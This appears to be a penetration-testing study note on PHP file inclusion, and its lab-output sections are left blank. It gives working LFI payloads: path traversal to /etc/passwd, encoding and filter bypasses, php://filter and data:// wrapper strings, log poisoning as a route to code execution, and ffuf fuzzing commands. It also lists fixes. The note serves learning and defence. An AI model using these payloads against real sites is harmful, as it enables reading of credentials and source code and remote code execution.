# File Inclusion

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Abuse a parameter that includes a file (`?page=`, `?lang=`) to read local files (**LFI**), disclose source, or get code execution. Remote inclusion (**RFI**) pulls a file from your server when `allow_url_include` is on.

## Basic LFI & path traversal
```text
http://t/?lang=/etc/passwd                       # direct include
http://t/?lang=../../../../etc/passwd            # escape the intended dir
http://t/?lang=....//....//etc/passwd            # if ../ is filtered non-recursively
```
Windows targets: `..\..\..\windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`.

## Bypasses
- **Non-recursive `../` filter:** `....//`, `..././`, `....\/` (the filter strips one `../`, leaving a valid one).
- **Encoding:** URL-encode `%2e%2e%2f`, double-encode `%252e%252e%252f`, overlong UTF-8.
- **Approved-path filter** (must start with `./languages/`): prepend it then traverse: `./languages/../../../etc/passwd`.
- **Appended extension** (code adds `.php`): use a PHP wrapper (below); on *old* PHP, null byte `%00` or path truncation (both obsolete on modern PHP).

## PHP wrappers (LFI → source disclosure / RCE)
```text
# read PHP SOURCE (normally it'd execute) — base64 so it survives transit:
?lang=php://filter/convert.base64-encode/resource=config.php   → base64 -d to read
# data/input wrappers for RCE (if allow_url_include):
?lang=data://text/plain;base64,<base64-of-php>
?lang=php://input   (POST the PHP in the body)
# expect:// for direct command exec (if the extension is loaded)
```

## LFI → RCE paths
- **PHP filter source disclosure** → read config/source → find creds or the next bug.
- **Log poisoning:** inject PHP into a log (User-Agent → access.log, or auth.log/ mail) then LFI the log → it executes. (Webshell payload not stored here.)
- **PHP session / file upload + LFI**, `/proc/self/environ`, data/input wrappers.

## Find include params & files
```bash
ffuf -w params.txt -u "http://t/?FUZZ=/etc/passwd"      # discover the vulnerable param
ffuf -w files.txt  -u "http://t/?lang=FUZZ"             # fuzz include targets
```

## Fix
Whitelist allowed files (not user input → path), disable `allow_url_include`/`allow_url_fopen`, sanitize `../`, least-privilege file perms, store sensitive files outside webroot.

> LFI ladder: read `/etc/passwd` to confirm → `php://filter` to pull source/creds → escalate to RCE via log poisoning or a data/input wrapper. The base64 filter is the key trick — it lets you read PHP that would otherwise just execute.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
